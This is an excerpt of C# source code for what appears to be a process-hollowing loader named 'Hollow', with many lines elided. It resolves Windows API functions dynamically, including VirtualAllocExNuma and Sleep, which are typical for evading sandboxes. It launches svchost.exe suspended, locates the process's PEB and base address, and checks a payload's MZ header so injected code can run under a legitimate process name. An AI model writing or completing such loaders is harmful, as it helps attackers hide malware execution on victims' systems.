...
namespace Hollow
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            DELEGATES.VirtualAllocExNuma VirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocExNuma)) as DELEGATES.VirtualAllocExNuma;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            DELEGATES.GetCurrentProcess GetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.GetCurrentProcess)) as DELEGATES.GetCurrentProcess;
            ...
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "Sleep");
            DELEGATES.Sleep Sleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.Sleep)) as DELEGATES.Sleep;
            ...
            if (succ)
            {
                Console.WriteLine($"[*] Started 'svchost.exe' in a suspended state with PID {pi.dwProcessId}. Success: {succ}.");
            }
            ...
            if (succ)
            {
                Console.WriteLine($"[*] Got process information and located PEB address of process at {"0x" + ptrToBaseImage.ToString("x")}. Success: {success == 0}.");
            }
            ...
            Console.WriteLine($"[*] DEBUG: Executable base address: {"0x" + processBase.ToString("x")}.");

            //MZ
            Console.WriteLine("{0}{1}", Convert.ToChar(data[0]), Convert.ToChar(data[1]));
